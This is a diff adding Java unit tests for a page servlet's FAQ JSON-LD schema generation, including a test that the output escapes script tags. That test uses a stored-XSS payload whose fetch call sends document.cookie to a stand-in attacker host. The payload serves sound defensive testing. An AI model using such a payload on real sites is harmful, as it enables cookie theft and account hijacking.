@@ -38,6 +38,7 @@ import com.fasterxml.jackson.databind.JsonNode;
 import com.fasterxml.jackson.databind.ObjectMapper;
 import com.simisinc.platform.application.cms.LoadWebPageCommand;
 import com.simisinc.platform.domain.model.SocialMediaLink;
+import com.simisinc.platform.domain.model.cms.FaqQuestion;
 import com.simisinc.platform.domain.model.cms.WebPage;
 import com.simisinc.platform.domain.model.items.Collection;
 import com.simisinc.platform.domain.model.items.Item;
@@ -115,6 +116,74 @@ class PageServletTest {
     JsonNode product = parsed.get("@graph").get(3);
     assertEquals("Product", product.get("@type").asText());
     assertTrue(product.get("name").asText().contains("</script><script>"));
+  }
+
+  @Test
+  void computeFaqSchemaReturnsNullWhenThereAreNoQuestions() {
+    assertNull(PageServlet.computeFaqSchema(new PageRenderInfo()));
+  }
+
+  @Test
+  void computeFaqSchemaBuildsAQuestionEntityForEachFaqQuestion() {
+    PageRenderInfo pageRenderInfo = new PageRenderInfo();
+    FaqQuestion first = new FaqQuestion();
+    first.setQuestion("What is a widget?");
+    first.setAnswerHtml("A <strong>widget</strong> is a small thing.");
+    first.setAnswerText("A widget is a small thing.");
+    FaqQuestion second = new FaqQuestion();
+    second.setQuestion("How much do they cost?");
+    second.setAnswerHtml("Prices vary.");
+    second.setAnswerText("Prices vary.");
+    List<FaqQuestion> faqQuestionList = new ArrayList<>();
+    faqQuestionList.add(first);
+    faqQuestionList.add(second);
+    pageRenderInfo.addFaqQuestions(faqQuestionList);
+
+    Map<String, Object> faqPage = PageServlet.computeFaqSchema(pageRenderInfo);
+
+    assertEquals("FAQPage", faqPage.get("@type"));
+    @SuppressWarnings("unchecked")
+    List<Map<String, Object>> mainEntity = (List<Map<String, Object>>) faqPage.get("mainEntity");
+    assertEquals(2, mainEntity.size());
+    assertEquals("Question", mainEntity.get(0).get("@type"));
+    assertEquals("What is a widget?", mainEntity.get(0).get("name"));
+    @SuppressWarnings("unchecked")
+    Map<String, Object> acceptedAnswer = (Map<String, Object>) mainEntity.get(0).get("acceptedAnswer");
+    assertEquals("Answer", acceptedAnswer.get("@type"));
+    assertEquals("A widget is a small thing.", acceptedAnswer.get("text"),
+        "the schema must use the HTML-stripped answer, not the widget's rendered HTML");
+  }
+
+  @Test
+  void generateJsonLdDataEscapesAPoisonedFaqQuestion() {
+    PageRenderInfo pageRenderInfo = new PageRenderInfo();
+    pageRenderInfo.setPageUrl("https://example.org/faq");
+    FaqQuestion poisoned = new FaqQuestion();
+    poisoned.setQuestion("</script><script>fetch('https://evil.example/steal?c='+document.cookie)</script>");
+    poisoned.setAnswerText("Also \"quoted\" and <b>bold</b>, stripped or not");
+    List<FaqQuestion> faqQuestionList = new ArrayList<>();
+    faqQuestionList.add(poisoned);
+    pageRenderInfo.addFaqQuestions(faqQuestionList);
+
+    Map<String, String> sitePropertyMap = new HashMap<>();
+    sitePropertyMap.put("site.name", "Example Co");
+
+    String jsonLd;
+    try (MockedStatic<SocialMediaLinkRepository> socialLinks = mockStatic(SocialMediaLinkRepository.class)) {
+      socialLinks.when(SocialMediaLinkRepository::findAll).thenReturn(Collections.emptyList());
+      // "/faq" is a single segment -- computeBreadcrumbList returns null, so @graph stays
+      // [Organization, WebPage, FAQPage]
+      jsonLd = PageServlet.generateJsonLdData(pageRenderInfo, "https://example.org", "/faq", sitePropertyMap, null, null, null);
+    }
+
+    assertFalse(jsonLd.toLowerCase().contains("</script"),
+        "a poisoned question must not be able to close the surrounding <script> tag: " + jsonLd);
+    assertFalse(jsonLd.contains("<script>"), "a poisoned question must not open a new <script> tag: " + jsonLd);
+
+    JsonNode parsed = assertDoesNotThrow(() -> MAPPER.readTree(jsonLd));
+    JsonNode faqPage = parsed.get("@graph").get(2);
+    assertEquals("FAQPage", faqPage.get("@type").asText());
+    assertTrue(faqPage.get("mainEntity").get(0).get("name").asText().contains("</script><script>"));
   }
 
   @Test
